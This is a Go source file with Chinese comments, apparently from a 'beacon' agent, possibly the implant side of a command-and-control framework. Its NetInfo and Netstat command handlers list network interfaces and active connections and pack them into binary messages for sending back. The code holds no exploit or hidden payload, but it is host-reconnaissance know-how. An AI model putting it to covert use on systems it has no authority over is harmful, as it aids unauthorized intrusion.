package command

import (
	"beacon/pkg/utils/packet"
	"net"
)

// NetInfoResult 是网络接口信息查询的返回结果。
type NetInfoResult struct {
	Interfaces []NetworkInterface `json:"interfaces"`
}

// NetworkInterface 描述单个网络接口的配置和状态。
type NetworkInterface struct {
	Index        int      `json:"index"`         // 接口索引
	Name         string   `json:"name"`          // 接口名称（如 eth0）
	MTU          int      `json:"mtu"`           // 最大传输单元
	Flags        []string `json:"flags"`         // 接口标志（up、loopback 等）
	HardwareAddr string   `json:"hardware_addr"` // MAC 地址
	Addrs        []string `json:"addrs"`         // 绑定的 IP 地址列表
	IsUp         bool     `json:"is_up"`         // 是否已启用
	IsLoopback   bool     `json:"is_loopback"`   // 是否回环接口
	IsMulticast  bool     `json:"is_multicast"`  // 是否支持多播
}

// NetstatResult 是网络连接查询的返回结果。
type NetstatResult struct {
	Connections []NetworkConnection `json:"connections"`
}

// NetworkConnection 描述一条网络连接的五元组和状态。
type NetworkConnection struct {
	Protocol      string `json:"protocol"`       // tcp/tcp6/udp/udp6
	LocalAddress  string `json:"local_address"`  // 本地地址
	LocalPort     uint32 `json:"local_port"`     // 本地端口
	RemoteAddress string `json:"remote_address"` // 远端地址
	RemotePort    uint32 `json:"remote_port"`    // 远端端口
	State         string `json:"state"`          // 连接状态（ESTABLISHED/LISTEN 等）
	PID           uint32 `json:"pid"`            // 所属进程 ID（部分平台为 0）
}

// NetInfo 收集所有网络接口信息并序列化为二进制包。
func NetInfo(p *packet.Parser) ([]byte, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	result := NetInfoResult{Interfaces: make([]NetworkInterface, 0, len(ifaces))}
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		addrStrings := make([]string, 0, len(addrs))
		for _, addr := range addrs {
			addrStrings = append(addrStrings, addr.String())
		}

		result.Interfaces = append(result.Interfaces, NetworkInterface{
			Index:        iface.Index,
			Name:         iface.Name,
			MTU:          iface.MTU,
			Flags:        interfaceFlags(iface.Flags),
			HardwareAddr: iface.HardwareAddr.String(),
			Addrs:        addrStrings,
			IsUp:         iface.Flags&net.FlagUp != 0,
			IsLoopback:   iface.Flags&net.FlagLoopback != 0,
			IsMulticast:  iface.Flags&net.FlagMulticast != 0,
		})
	}

	return PackNetInfoResult(result)
}

// Netstat 收集所有网络连接信息并序列化为二进制包。
func Netstat(p *packet.Parser) ([]byte, error) {
	connections, err := listNetworkConnections()
	if err != nil {
		return nil, err
	}

	return PackNetstatResult(NetstatResult{Connections: connections})
}

// PackNetInfoResult 将网络接口信息序列化为二进制包。
// 格式：[接口数 int32] + 每个接口的 [Index, Name, MTU, Flags..., HWAddr, Addrs..., IsUp, IsLoopback, IsMulticast]
func PackNetInfoResult(result NetInfoResult) ([]byte, error) {
	values := make([]any, 0)
	values = append(values, int32(len(result.Interfaces)))
	for _, iface := range result.Interfaces {
		values = append(values,
			int32(iface.Index),
			iface.Name,
			int32(iface.MTU),
			int32(len(iface.Flags)),
		)
		for _, flag := range iface.Flags {
			values = append(values, flag)
		}
		values = append(values,
			iface.HardwareAddr,
			int32(len(iface.Addrs)),
		)
		for _, addr := range iface.Addrs {
			values = append(values, addr)
		}
		values = append(values,
			iface.IsUp,
			iface.IsLoopback,
			iface.IsMulticast,
		)
	}
	return packet.PackArray(values)
}

// PackNetstatResult 将网络连接列表序列化为二进制包。
// 格式：[连接数 int32] + 每条连接的 [Protocol, LocalAddr, LocalPort, RemoteAddr, RemotePort, State, PID]
func PackNetstatResult(result NetstatResult) ([]byte, error) {
	values := make([]any, 0, 1+len(result.Connections)*7)
	values = append(values, int32(len(result.Connections)))
	for _, conn := range result.Connections {
		values = append(values,
			conn.Protocol,
			conn.LocalAddress,
			int32(conn.LocalPort),
			conn.RemoteAddress,
			int32(conn.RemotePort),
			conn.State,
			int32(conn.PID),
		)
	}
	return packet.PackArray(values)
}

func interfaceFlags(flags net.Flags) []string {
	result := make([]string, 0, 5)
	if flags&net.FlagUp != 0 {
		result = append(result, "up")
	}
	if flags&net.FlagBroadcast != 0 {
		result = append(result, "broadcast")
	}
	if flags&net.FlagLoopback != 0 {
		result = append(result, "loopback")
	}
	if flags&net.FlagPointToPoint != 0 {
		result = append(result, "point_to_point")
	}
	if flags&net.FlagMulticast != 0 {
		result = append(result, "multicast")
	}
	return result
}
